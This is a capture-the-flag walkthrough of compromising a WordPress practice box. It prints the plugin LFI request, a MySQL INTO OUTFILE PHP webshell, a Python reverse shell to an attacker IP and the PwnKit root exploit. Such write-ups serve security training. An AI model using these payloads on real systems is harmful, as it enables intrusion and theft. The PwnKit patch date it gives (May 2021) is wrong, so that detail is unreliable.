
## Overview

**Platform:** VulnHub-style practice box **Operating System:** Linux (Ubuntu) **Web Application:** WordPress + Advanced Video Embed plugin v1.0 **Initial Access:** WordPress plugin LFI → wp-config.php credential leak → MySQL root login → `INTO OUTFILE` webshell write → RCE **Initial Access Type:** Web application + database exploitation chain **Privilege Escalation:** Two independently valid routes — unrestricted sudo via leaked bash-history credentials, or PwnKit (CVE-2021-4034) against a vulnerable SUID `pkexec` **Final Access:** Root

### Key Techniques

- `-Pn` to bypass ICMP-blocking host discovery
- Full port range scan to catch non-default ports
- Nikto for `robots.txt` and header enumeration when directory brute-forcing fails
- HTTPS-vs-HTTP service discovery on a non-standard port
- Directory listing misconfiguration abuse
- WordPress plugin version fingerprinting via `readme.txt`
- LFI-to-image-conversion exploit chaining
- Credential leak via `wp-config.php`
- MySQL root login due to app misconfiguration
- `SELECT ... INTO OUTFILE` webshell write
- Python reverse shell one-liner + URL encoding
- World-readable home directories (misconfiguration)
- Bash history credential leakage
- Unrestricted sudo (`ALL : ALL) ALL`)
- PwnKit / CVE-2021-4034 (SUID `pkexec` local privesc)

---

# Attack Path

```text
nmap -Pn (host was blocking ICMP)
        ↓
Full Port Scan Reveals 12380/tcp
        ↓
Apache "Coming Soon" Placeholder Page
        ↓
Nikto Reveals robots.txt Entries (/blogblog/)
        ↓
HTTPS (not HTTP) Reveals WordPress on /blogblog/
        ↓
Directory Listing Exposes Installed Plugins
        ↓
Advanced Video Embed v1.0 Identified via readme.txt
        ↓
LFI PoC Leaks wp-config.php
        ↓
MySQL root:plbkac Recovered
        ↓
LFI Again to Find DocumentRoot (default-ssl.conf)
        ↓
MySQL INTO OUTFILE Writes PHP Webshell
        ↓
RCE as www-data
        ↓
Reverse Shell
        ↓
World-Readable /home Directories
        ↓
JKanode's .bash_history Leaks peter's SSH Password
        ↓
su peter
        ↓
Branch A: sudo -l Shows Unrestricted (ALL:ALL) ALL → sudo su
Branch B: SUID pkexec Found, Vulnerable to PwnKit (CVE-2021-4034) → Root via Exploit
        ↓
Root Shell
```

---

# 1. Nmap Enumeration

## Working around blocked ICMP

```bash
sudo nmap <target>
```

```text
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
```

```bash
sudo nmap <target> -Pn
```

> [!tip] Recognition Pattern "Host seems down" from Nmap doesn't mean the host is actually down — it means Nmap's default ICMP-based host discovery got blocked. `-Pn` skips that check and assumes the host is up, which is worth trying by default any time a scan reports a host down that you have other reason to believe is live.

## Full port range

```bash
sudo nmap -p- <target> -Pn
```

Reveals a service on **`12380/tcp`** that a default top-1000 scan would have missed entirely.

```bash
sudo nmap -p 12380 -sC -sV <target> -Pn
```

```text
12380/tcp  http  Apache 2.4.18 (Ubuntu) — "Tim, we need to-do better next year for Initech"
```

> [!tip] Recognition Pattern Always run a full `-p-` scan on every box, even after a default scan already found something. Services tucked away on unusual ports (here, a full web application on `12380`) are common precisely because they're meant to be less discoverable.

---

# 2. Web Enumeration

## Initial page

```bash
curl http://<target>:12380/ | html2text
```

A generic "Coming Soon" placeholder — nothing actionable from the page itself.

## Directory brute-forcing fails — pivot to Nikto

Standard gobuster/dirb brute-forcing came up empty even with large wordlists. Nikto, however, parses `robots.txt` and picks up disallowed entries automatically:

```bash
nikto -h <target>:12380
```

```text
+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
```

> [!tip] Recognition Pattern When wordlist-based brute-forcing dead-ends, `robots.txt` is a cheap, fast source of hidden paths that the site's own operators inadvertently disclosed — Nikto surfaces these automatically as part of its general scan, so it's worth running even when you already have a directory brute-force in progress or completed.

## HTTP vs. HTTPS matters

Browsing `/blogblog/` over plain HTTP still shows the same placeholder page. Nikto's scan output also mentioned the server uses TLS — switching to **HTTPS** on the same port reveals an entirely different application (WordPress):

```bash
curl -k https://<target>:12380/blogblog/ | html2text
```

> [!warning] Same Port, Different Protocol, Different Application A single port serving both HTTP and HTTPS with genuinely different content on each is an easy thing to miss if you only test one protocol. When Nikto or any scan mentions SSL/TLS details for a port you assumed was plain HTTP, always retest with `https://` and `-k` (to accept self-signed certs).

---

# 3. WordPress Plugin Enumeration

The default plugin directory (`/wp-content/plugins/`) has **directory listing enabled** — a misconfiguration that hands over the full plugin inventory:

```bash
curl -k -s https://<target>:12380/blogblog/wp-content/plugins/ | html2text
```

```text
advanced-video-embed-embed-videos-or-playlists/
hello.php
shortcode-ui/
two-factor/
```

Reading the Advanced Video plugin's `readme.txt` confirms it's running **v1.0**:

```bash
curl -k -s https://<target>:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt | html2text | head
```

> [!tip] Key Principle Directory listing on a plugin/module folder is effectively a free inventory of every installed component and its version, straight from `readme.txt`/`CHANGELOG` files — far faster than blind plugin enumeration tools when it's available.

---

# 4. Exploitation — WordPress Plugin LFI

Advanced Video Embed v1.0 has a known **Local File Inclusion** vulnerability, exploited through a `admin-ajax.php` action that's supposed to convert a thumbnail image, but instead copies an arbitrary file (specified by path traversal in the `thumb` parameter) into the uploads directory disguised as a `.jpeg`.

```text
https://<target>:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=<any>&short=1&term=1&thumb=<traversal_path>
```

**Leaking `wp-config.php`:**

```bash
curl -k "https://<target>:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=123456789&short=1&term=1&thumb=../wp-config.php"
```

The resulting file appears in `/wp-content/uploads/` under a random `.jpeg` name — download and read it directly, since it's really PHP source text wearing a `.jpeg` extension:

```bash
curl -k -s https://<target>:12380/blogblog/wp-content/uploads/<generated_name>.jpeg --output wp-config.php
cat wp-config.php
```

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'plbkac');
define('DB_HOST', 'localhost');
```

The application is misconfigured to use the **MySQL root account** directly — a serious escalation of impact, since MySQL root can write arbitrary files via `SELECT ... INTO OUTFILE` if `secure_file_priv` isn't restricting it.

> [!tip] Key Principle An LFI that only reads `.php` config files might look "just" like an info leak — but any config file containing database credentials is worth treating as a potential RCE primitive, especially if the database account turns out to be more privileged than the application actually needs (a very common misconfiguration).

---

# 5. RCE via MySQL `INTO OUTFILE`

Connected using the leaked credentials:

```bash
mysql -u root -pplbkac -D wordpress -h <target>
```

To write a webshell to a web-served path, the absolute filesystem web root was needed. Reused the **same LFI** to fetch the Apache SSL vhost config:

```bash
curl -k "https://<target>:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=987654321&short=1&term=1&thumb=/etc/apache2/sites-available/default-ssl.conf"
```

```bash
grep DocumentRoot default-ssl.conf
# DocumentRoot /var/www/https
```

> [!tip] Recognition Pattern A single LFI primitive is rarely "one file, one use." Reusing it against Apache/nginx vhost configs is a reliable way to discover the actual document root when it isn't the obvious default — necessary here before a file write could be aimed at a web-accessible path.

**Writing the webshell via MySQL:**

```sql
SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "/var/www/https/blogblog/wp-content/uploads/shell.php";
```

**Confirming RCE:**

```bash
curl -k "https://<target>:12380/blogblog/wp-content/uploads/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!tip] Key Principle A MySQL account with `FILE` privilege (root, by default, unless restricted) can write arbitrary files anywhere the MySQL service process has filesystem permissions for — `INTO OUTFILE` turns leaked database credentials directly into a webshell-write primitive, no separate upload vulnerability required.

---

# 6. Reverse Shell

```bash
sudo nc -lvp 666
```

Python reverse shell one-liner, URL-encoded and passed via the `cmd` parameter:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
curl -k "https://<target>:12380/blogblog/wp-content/uploads/shell.php?cmd=<url_encoded_payload>"
```

Shell received as `www-data`.

---

# 7. Privilege Escalation Enumeration

## World-readable home directories

```bash
ls -l /home
```

Normally, other users' home directories aren't readable — here, permissions are misconfigured to allow browsing every user's home folder.

> [!tip] Recognition Pattern World-readable `/home` (or individual home directories with loose permissions) is worth checking explicitly rather than assuming the default "you can't read other users' files" holds. When it doesn't, every user's dotfiles — `.bash_history`, `.ssh`, config files — become fair game.

## Bash history credential leak

```bash
cat /home/JKanode/.bash_history
```

```text
sshpass -p thisimypassword ssh JKanode@localhost
sshpass -p JZQuyIN5 ssh peter@localhost
```

Plaintext SSH passwords for two accounts, left behind because `.bash_history` was never cleared.

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
su peter
# Password: JZQuyIN5
```

> [!tip] Key Principle `su`/`ssh` require a real TTY — `su: must be run from a terminal` is a signal to spawn a proper pty (`python -c 'import pty;pty.spawn("/bin/bash")'`) before retrying, not a dead end.

---

# 8. Privilege Escalation — Two Independently Valid Routes

## Route A (as done): PwnKit — CVE-2021-4034

## What I did differently

Rather than immediately using peter's sudo access, checked for local SUID binaries and found **`pkexec`** was SUID-set and running a version vulnerable to **PwnKit** (CVE-2021-4034) — a widely-known local privilege escalation affecting `polkit`'s `pkexec` due to improper handling of command-line argument count, allowing environment variable injection that leads to arbitrary code execution as root.

- Exploit used: [ly4k/PwnKit](https://github.com/ly4k/PwnKit)

```bash
./PwnKit
```

Root shell obtained directly, without needing peter's leaked sudo password at all.

> [!tip] Recognition Pattern `pkexec` being SUID-root is completely normal and expected on most Linux distributions — it's how PolicyKit is designed to work. What matters is the **version**. CVE-2021-4034 affected essentially all `polkit` versions prior to the patch (released May 2021), meaning any box built or imaged before that point is very likely vulnerable. Worth checking `pkexec --version` (or just trying the exploit) on any Linux box, independent of whatever other privesc path you've already found — it's fast, reliable, and doesn't require any credentials at all.

## Route B (confirmed also works): Unrestricted sudo

Also went back and confirmed the credential-leak path from the original walkthrough works as an alternative:

```bash
sudo -l
```

```text
User peter may run the following commands on red:
    (ALL : ALL) ALL
```

```bash
sudo su
```

```bash
whoami
# root
```

> [!tip] Multiple Valid Privesc Paths on the Same Box This box has (at least) two completely independent routes to root: a credential-leak-driven unrestricted sudo rule, and a version-driven local kernel/service exploit (PwnKit) that requires no credentials whatsoever. Worth checking for both categories of privesc on every box — misconfiguration-based (sudo, cron, SUID scripts) and version-based (known CVEs in installed SUID binaries, kernel exploits) — since either one alone is sufficient, and the "fast" one (PwnKit, once you know to check for it) can save significant enumeration time versus digging through every user's history and permissions.

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|Nmap reports host down|Retry immediately with `-Pn` — ICMP is often just blocked|
|Only a default scan was run|Always follow up with `-p-` for the full range|
|Directory brute-forcing yields nothing|Try Nikto — `robots.txt` parsing often succeeds where wordlists fail|
|A service mentions SSL/TLS in scan output|Retest the same port over HTTPS, don't assume HTTP-only|
|Plugin/module directory has listing enabled|Free inventory via `readme.txt`/`CHANGELOG` — check versions directly|
|LFI reads app config files|Treat as a potential RCE primitive if DB credentials are leaked, especially with elevated DB privileges|
|DB account has `FILE` privilege|`INTO OUTFILE` can write a webshell directly, no upload feature needed|
|`su`/`ssh` fails with a TTY error|Spawn a pty first (`pty.spawn`), then retry|
|`/home` or specific home dirs are world-readable|Check every user's dotfiles for leaked credentials, especially `.bash_history`|
|Any Linux box, any privesc path already found|Also check `pkexec` version for PwnKit (CVE-2021-4034) — fast, credential-free, broadly applicable|

---

# Key Lessons

> [!tip] "Host Seems Down" Often Just Means ICMP Is Blocked Retry with `-Pn` by default whenever Nmap reports a host down that you have reason to believe is live.

> [!tip] Nikto Complements, Doesn't Replace, Directory Brute-Forcing `robots.txt` parsing can surface paths that wordlist-based tools miss entirely — run both.

> [!tip] Test Both HTTP and HTTPS on Every Web Port The same port can serve completely different content depending on protocol — don't assume based on the first response you get.

> [!tip] An LFI Primitive Is Reusable, Not One-Shot Once you have file read via LFI, use it repeatedly — config files for credentials, vhost configs for the document root, anything else useful to the rest of the chain.

> [!tip] Elevated Database Privileges Turn Credential Leaks Into RCE A leaked DB password is far more dangerous when the account has `FILE` privilege — `INTO OUTFILE` is a direct webshell-write primitive.

> [!tip] Always Check for Multiple Independent Privesc Paths Misconfiguration-based routes (sudo rules, writable cron scripts, leaked credentials) and version-based routes (known CVEs in SUID binaries, kernel exploits) are two different categories worth checking independently — a fast, credential-free exploit like PwnKit can outright replace a slower enumeration-heavy path when both are available.